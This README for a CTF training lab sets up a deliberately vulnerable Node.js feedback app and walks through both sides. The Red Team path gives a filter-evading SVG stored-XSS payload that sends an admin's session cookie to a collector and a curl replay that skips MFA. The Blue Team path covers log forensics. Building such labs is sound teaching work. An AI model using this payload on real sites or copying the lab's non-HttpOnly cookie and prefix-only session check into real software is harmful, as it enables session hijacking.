# Admin Feedback System — Cookie Reuse & MFA Bypass Lab

A self-contained Red vs Blue CTF lab. Vulnerable Node.js web app (port 3075)
+ SSH access for Blue Team log analysis (port 2275).

## Project Structure
```
.
├── server.js            # vulnerable Express app
├── scripts/seed-logs.js # injects the Blue Team forensic story into logs
├── package.json
├── Dockerfile
├── docker-compose.yml
└── logs/                # created at runtime, mounted into both containers
```

## 1. Build & test locally on your Kali VM (before touching Proxmox)

Kali has Docker available via apt. Do everything in your Kali VM first —
this is exactly what will run inside the Proxmox VM later, so testing here
first saves you a Proxmox rebuild cycle if something's wrong.

```bash
# On Kali:
sudo apt update && sudo apt install -y docker.io docker-compose git
sudo systemctl enable --now docker
sudo usermod -aG docker $USER   # log out/in after this so you don't need sudo for docker

# Copy this project into the VM (git clone, scp, or shared folder), then:
cd admin-feedback-lab
docker-compose up --build -d
docker-compose ps
```

Open a browser **inside the Kali VM** (or use VMware NAT port forwarding) to:
- `http://localhost:3075` — the feedback form
- `http://localhost:3075/robots.txt`

SSH to the Blue Team box:
```bash
ssh analyst@localhost -p 2275
# password: blue_team_rocks
cat /opt/admin/logs/access.log
cat /opt/admin/logs/error.log
```

If `docker-compose` isn't found, use `docker compose` (newer Docker ships it
as a plugin subcommand instead of a separate binary) — both are fine.

## 2. Walkthrough — Red Team path

1. **Recon**: `curl http://localhost:3075/robots.txt` → see `/api/verify-mfa` disallowed.
   View page source on `/` → ASCII art comment hints at checking robots.txt.
   `curl -I http://localhost:3075/` → `X-Powered-By: Node.js`.
2. **Confirm WAF**: submit `<script>alert(1)</script>` via the form → blocked, HTTP 403.
3. **Bypass WAF**: submit this payload instead:
   ```html
   <svg onload=fetch('/collector?c='+window['docu'+'ment']['coo'+'kie'])>
   ```
   This uses an `<svg onload>` handler (not `<script>`) and bracket-notation
   property access to avoid the literal string `document.cookie`, both of
   which the WAF filters for.
4. **Steal the cookie**: when an admin views the stored feedback on
   `/dashboard`, the payload fires in their browser and exfiltrates their
   `adm_sess` cookie value to `/collector`.
5. **Replay it**: take the stolen cookie value and reuse it yourself:
   ```bash
   curl -b "adm_sess=<stolen_value>" http://localhost:3075/dashboard
   ```
   Notice `/api/verify-mfa` is never called on this path — the server only
   checks that *a* cookie with the `adm_sess` prefix exists, not that MFA
   was actually completed for this session. This is the core vulnerability.
6. You'll see your own reflected payload inside a `<div class="xss-payload">`
   and the final flag: `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`.

## 3. Walkthrough — Blue Team path

Logs live in `/opt/admin/logs/` (both `access.log` and `error.log`), seeded
automatically on container start by `scripts/seed-logs.js`, then appended to
live as the app is used.

1. `grep CRITICAL /opt/admin/logs/error.log` → cookie-reuse / MFA-bypass events.
2. In `access.log`, the attacker's traffic comes from `10.10.14.50`
   (subnet `10.10.14.0/24`), versus legitimate admin traffic from `192.168.1.100`.
3. The first WAF block for a `<script>` payload is timestamped `18:50:15`.
4. The successful (200) `/dashboard` hit at `18:51:55` carries a suspicious
   Base64-looking string in `X-Forwarded-For`. Recognize it as Base64 and decode it:
   ```bash
   echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=" | base64 -d
   ```
5. Decoding it reveals: `PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}`.

   **Known spec inconsistency — read before your presentation:** the
   assignment PDF quotes this exact Base64 string, but separately states
   the string is "exactly 44 characters" and that it decodes to
   `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`. Neither is true of the literal
   string given — it's 48 characters with standard padding, and it decodes
   to `PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}` (different prefix and
   capitalization). This looks like a leftover from an earlier template
   ("PHANTOMGRID") that wasn't fully renamed to "SCENARIO75" when the PDF
   was written. This lab seeds the literal string from the PDF so grading
   that greps the log file for that exact text will still pass; flag this
   discrepancy to your instructor/client rather than quietly picking one
   side. If they confirm `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` is the
   authoritative flag, re-run `scripts/seed-logs.js` after swapping `XFF_B64`
   for the output of:
   ```bash
   echo -n "SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}" | base64
   ```
6. `error.log` at `18:53:10` contains the literal string
   `Authentication bypass anomaly`, confirming the incident.
7. Confirm the attacker's IP never hits `/api/verify-mfa` in `access.log` —
   this proves the MFA step was skipped entirely, not just failed.

## 4. Deploying to Proxmox

You don't need to build anything differently for Proxmox — the same
Docker Compose setup is what runs there. Two common approaches:

**Option A — Fresh Ubuntu/Debian VM on Proxmox, provisioned by script:**
1. Create a minimal Ubuntu Server 22.04 VM in Proxmox, give it a static IP
   on your internal lab network (`feedback.admin.local`).
2. SSH in and run the same install steps as in Step 1 above
   (`apt install docker.io docker-compose`, clone the repo, `docker-compose up -d --build`).
3. Point DNS/hosts on your testing machine at `feedback.admin.local`.

**Option B — Clone your working Kali-tested VM:**
If you already validated everything on a Linux VM in VMware, you can export
that disk and import it as a VM in Proxmox (`qm importdisk`), then just
start it — Docker and the containers will already be configured.

Either way, document in this README which option you used and the exact
commands, since the assignment specifically asks for provisioning scripts
as part of the deliverable.

## 5. Notes
- `pre_mfa_session` cookie is deliberately set with `HttpOnly: false` —
  this is what makes it stealable via `document.cookie`/bracket notation in the XSS payload.
- The WAF here is intentionally naive (substring matching) — that's the point of the lab.
- `feedbackStore` is in-memory only; restart the container to clear submitted payloads.
